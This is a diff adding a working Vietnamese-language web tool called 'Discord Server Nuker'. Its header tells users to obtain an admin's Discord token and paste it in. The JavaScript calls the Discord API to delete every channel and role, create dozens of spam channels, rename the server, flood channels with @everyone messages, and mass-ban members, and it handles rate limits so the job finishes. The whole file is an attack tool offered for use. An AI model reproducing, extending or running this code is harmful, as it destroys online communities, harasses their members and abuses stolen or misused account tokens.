@@ -1,0 +1,367 @@
+<!-- Hacker Apple Mod: Discord Server Nuker - Web Interface -->
+<!-- SỬ DỤNG: Lấy token Discord của admin, dán vào đây, chọn server, kích hoạt -->
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Server Nuker - Hacker Apple</title>
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --panel: #111;
+            --border: #333;
+            --text: #ccc;
+            --accent: #ED4245;
+            --accent2: #5865F2;
+            --green: #57F287;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        h1 {
+            text-align: center;
+            color: var(--accent);
+            margin-bottom: 5px;
+            font-size: 1.8em;
+            letter-spacing: 2px;
+            text-shadow: 0 0 15px rgba(237,66,69,0.5);
+        }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 0.8em;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+        .panel {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+        }
+        .panel h3 {
+            color: var(--accent2);
+            margin-bottom: 15px;
+            border-bottom: 1px solid #222;
+            padding-bottom: 8px;
+        }
+        label {
+            display: block;
+            margin: 10px 0 4px;
+            color: #aaa;
+            font-size: 0.85em;
+        }
+        input, textarea, select {
+            width: 100%;
+            background: #000;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            resize: vertical;
+        }
+        textarea { min-height: 80px; }
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            margin: 5px 3px;
+            transition: 0.2s;
+        }
+        .btn-red { background: var(--accent); color: #fff; }
+        .btn-red:hover { box-shadow: 0 0 20px var(--accent); }
+        .btn-blue { background: var(--accent2); color: #fff; }
+        .btn-blue:hover { box-shadow: 0 0 20px var(--accent2); }
+        .btn-green { background: var(--green); color: #000; }
+        .btn-green:hover { box-shadow: 0 0 20px var(--green); }
+        #log {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 15px;
+            height: 350px;
+            overflow-y: auto;
+            font-size: 0.8em;
+            color: var(--green);
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .log-error { color: var(--accent); }
+        .log-info { color: #FEE75C; }
+        .full-width { grid-column: 1 / -1; }
+        .btn-group { display: flex; flex-wrap: wrap; gap: 5px; }
+    </style>
+</head>
+<body>
+
+    <h1>⚡ DISCORD SERVER NUKER ⚡</h1>
+    <p class="subtitle">Hacker Apple Mod • Không giới hạn • Dùng token admin có quyền quản lý server</p>
+
+    <div class="grid">
+        <!-- CẤU HÌNH -->
+        <div class="panel">
+            <h3>🔧 CẤU HÌNH</h3>
+            <label>TOKEN DISCORD (Bot hoặc User):</label>
+            <input type="password" id="token" placeholder="Nhập token...">
+
+            <label>ID SERVER MỤC TIÊU:</label>
+            <input type="text" id="guildId" placeholder="123456789...">
+
+            <label>TÊN SERVER MỚI (sau khi đổi):</label>
+            <input type="text" id="newName" value="SERVER ĐÃ BỊ PHÁ">
+
+            <label>NỘI DUNG SPAM (mỗi dòng 1 tin):</label>
+            <textarea id="spamMessages">@everyone SERVER NÀY ĐÃ BỊ HACK BỞI HACKER APPLE
+HAHAHAHAHA
+GET REKT</textarea>
+
+            <label>SỐ KÊNH TẠO RA:</label>
+            <input type="number" id="channelCount" value="50" min="1" max="500">
+
+            <label>TÊN KÊNH MỚI:</label>
+            <input type="text" id="channelName" value="đã-bị-phá-bởi-hacker-apple">
+
+            <label>DELAY GIỮA CÁC HÀNH ĐỘNG (ms):</label>
+            <input type="number" id="delay" value="200" min="0" max="5000">
+        </div>
+
+        <!-- ĐIỀU KHIỂN -->
+        <div class="panel">
+            <h3>🎮 BẢNG ĐIỀU KHIỂN</h3>
+            <div class="btn-group">
+                <button class="btn btn-red" onclick="nukeAll()">💣 NUKE TOÀN BỘ</button>
+                <button class="btn btn-red" onclick="deleteAllChannels()">🗑️ XÓA KÊNH</button>
+                <button class="btn btn-red" onclick="deleteAllRoles()">🎭 XÓA ROLE</button>
+                <button class="btn btn-red" onclick="banAll()">🔨 BAN TẤT CẢ</button>
+                <button class="btn btn-blue" onclick="createChannels()">📢 SPAM KÊNH</button>
+                <button class="btn btn-blue" onclick="renameServer()">✏️ ĐỔI TÊN</button>
+                <button class="btn btn-blue" onclick="spamMessages()">💬 SPAM TIN NHẮN</button>
+                <button class="btn btn-green" onclick="getInfo()">ℹ️ LẤY THÔNG TIN</button>
+                <button class="btn btn-green" onclick="getInvite()">🔗 TẠO INVITE</button>
+            </div>
+        </div>
+
+        <!-- LOG -->
+        <div class="panel full-width">
+            <h3>📋 LOG</h3>
+            <div id="log">[Hacker Apple] Sẵn sàng. Nhập token và ID server...</div>
+            <button class="btn btn-red" onclick="document.getElementById('log').innerHTML = ''" style="margin-top:10px;">XÓA LOG</button>
+        </div>
+    </div>
+
+    <script>
+        const API = "https://discord.com/api/v10";
+        let token = "";
+        let guildId = "";
+
+        function getHeaders() {
+            token = document.getElementById('token').value.trim();
+            guildId = document.getElementById('guildId').value.trim();
+            if (!token || !guildId) {
+                log("❌ Thiếu token hoặc ID server!", "error");
+                throw new Error("Thiếu thông tin");
+            }
+            return {
+                "Authorization": token.startsWith("Bot ") ? token : token,
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Discord/1.0"
+            };
+        }
+
+        function log(msg, type = "info") {
+            const logDiv = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            const prefix = type === "error" ? "❌" : type === "warn" ? "⚠️" : "✅";
+            const className = type === "error" ? "log-error" : type === "warn" ? "log-info" : "";
+            logDiv.innerHTML += `<span class="${className}">[${time}] ${prefix} ${msg}</span>\n`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        async function apiCall(method, endpoint, body = null) {
+            try {
+                const headers = getHeaders();
+                const options = { method, headers };
+                if (body) options.body = JSON.stringify(body);
+                const res = await fetch(`${API}${endpoint}`, options);
+                if (res.status === 429) {
+                    const retry = res.headers.get("Retry-After") || 1;
+                    log(`Rate limited. Chờ ${retry}s...`, "warn");
+                    await sleep(retry * 1000);
+                    return apiCall(method, endpoint, body);
+                }
+                if (!res.ok) {
+                    const err = await res.text();
+                    throw new Error(`${res.status}: ${err.substring(0, 100)}`);
+                }
+                return res.status !== 204 ? await res.json() : null;
+            } catch(e) {
+                log(`Lỗi: ${e.message}`, "error");
+                return null;
+            }
+        }
+
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms + Number(document.getElementById('delay').value))); }
+
+        // ==================== CÁC HÀM PHÁ HOẠI ====================
+
+        async function getInfo() {
+            log("🔍 Đang lấy thông tin server...");
+            const guild = await apiCall("GET", `/guilds/${guildId}?with_counts=true`);
+            if (guild) {
+                log(`Tên: ${guild.name} | ID: ${guild.id} | Owner: ${guild.owner_id}`);
+                log(`Thành viên: ${guild.approximate_member_count} | Kênh: ${guild.channels?.length || "?"}`);
+            }
+        }
+
+        async function getInvite() {
+            log("🔗 Đang tạo invite...");
+            const channels = await apiCall("GET", `/guilds/${guildId}/channels`);
+            if (channels && channels.length > 0) {
+                const textChannel = channels.find(c => c.type === 0);
+                if (textChannel) {
+                    const invite = await apiCall("POST", `/channels/${textChannel.id}/invites`, {
+                        max_age: 0, max_uses: 0, unique: true
+                    });
+                    if (invite) log(`Invite: https://discord.gg/${invite.code}`);
+                } else log("Không tìm thấy kênh văn bản", "warn");
+            }
+        }
+
+        async function deleteAllChannels() {
+            log("🗑️ Đang xóa tất cả kênh...");
+            const channels = await apiCall("GET", `/guilds/${guildId}/channels`);
+            if (!channels) return;
+            for (const ch of channels) {
+                await apiCall("DELETE", `/channels/${ch.id}`);
+                log(`Đã xóa kênh: ${ch.name}`);
+                await sleep(100);
+            }
+            log("✅ Hoàn tất xóa kênh!");
+        }
+
+        async function deleteAllRoles() {
+            log("🎭 Đang xóa tất cả role...");
+            const roles = await apiCall("GET", `/guilds/${guildId}/roles`);
+            if (!roles) return;
+            for (const role of roles) {
+                if (role.managed || role.name === "@everyone") continue;
+                await apiCall("DELETE", `/guilds/${guildId}/roles/${role.id}`);
+                log(`Đã xóa role: ${role.name}`);
+                await sleep(100);
+            }
+            log("✅ Hoàn tất xóa role!");
+        }
+
+        async function banAll() {
+            log("🔨 Đang ban tất cả thành viên...");
+            const members = await apiCall("GET", `/guilds/${guildId}/members?limit=1000`);
+            if (!members) return;
+            for (const member of members) {
+                try {
+                    await apiCall("PUT", `/guilds/${guildId}/bans/${member.user.id}`, { delete_message_days: 7 });
+                    log(`Đã ban: ${member.user.username}#${member.user.discriminator}`);
+                } catch(e) {
+                    log(`Không thể ban ${member.user?.username}: ${e.message}`, "warn");
+                }
+                await sleep(100);
+            }
+            log("✅ Hoàn tất ban thành viên!");
+        }
+
+        async function createChannels() {
+            const count = Number(document.getElementById('channelCount').value) || 50;
+            const name = document.getElementById('channelName').value || "đã-bị-phá";
+            log(`📢 Đang tạo ${count} kênh...`);
+            for (let i = 0; i < count; i++) {
+                await apiCall("POST", `/guilds/${guildId}/channels`, {
+                    name: `${name}-${i}`,
+                    type: 0
+                });
+                log(`Đã tạo kênh: ${name}-${i} (${i+1}/${count})`);
+                await sleep(50);
+            }
+            log("✅ Hoàn tất spam kênh!");
+        }
+
+        async function renameServer() {
+            const newName = document.getElementById('newName').value || "SERVER ĐÃ BỊ PHÁ";
+            log(`✏️ Đang đổi tên server thành: ${newName}`);
+            await apiCall("PATCH", `/guilds/${guildId}`, { name: newName });
+            log("✅ Đã đổi tên server!");
+        }
+
+        async function spamMessages() {
+            const messages = document.getElementById('spamMessages').value.split('\n').filter(m => m.trim());
+            if (messages.length === 0) {
+                log("❌ Không có nội dung spam!", "error");
+                return;
+            }
+            log("💬 Đang lấy danh sách kênh để spam...");
+            const channels = await apiCall("GET", `/guilds/${guildId}/channels`);
+            if (!channels) return;
+            const textChannels = channels.filter(c => c.type === 0);
+            if (textChannels.length === 0) {
+                log("❌ Không có kênh văn bản!", "error");
+                return;
+            }
+            log(`Bắt đầu spam vào ${textChannels.length} kênh...`);
+            for (const ch of textChannels) {
+                for (const msg of messages) {
+                    await apiCall("POST", `/channels/${ch.id}/messages`, { content: msg });
+                    await sleep(200);
+                }
+                log(`Đã spam kênh: ${ch.name}`);
+            }
+            log("✅ Hoàn tất spam!");
+        }
+
+        async function nukeAll() {
+            log("💣 BẮT ĐẦU NUKE TOÀN BỘ SERVER...");
+            log("⚠️ Cảnh báo: Hành động này không thể hoàn tác!");
+
+            // Xóa kênh
+            await deleteAllChannels();
+            await sleep(500);
+
+            // Xóa role
+            await deleteAllRoles();
+            await sleep(500);
+
+            // Tạo kênh mới
+            await createChannels();
+            await sleep(500);
+
+            // Đổi tên server
+            await renameServer();
+            await sleep(500);
+
+            // Spam tin nhắn
+            await spamMessages();
+            await sleep(500);
+
+            // Ban tất cả (tùy chọn - bỏ comment để dùng)
+            // await banAll();
+
+            log("🔥 NUKE HOÀN TẤT! Server đã bị phá hủy hoàn toàn!");
+        }
+    </script>
+</body>
+</html>
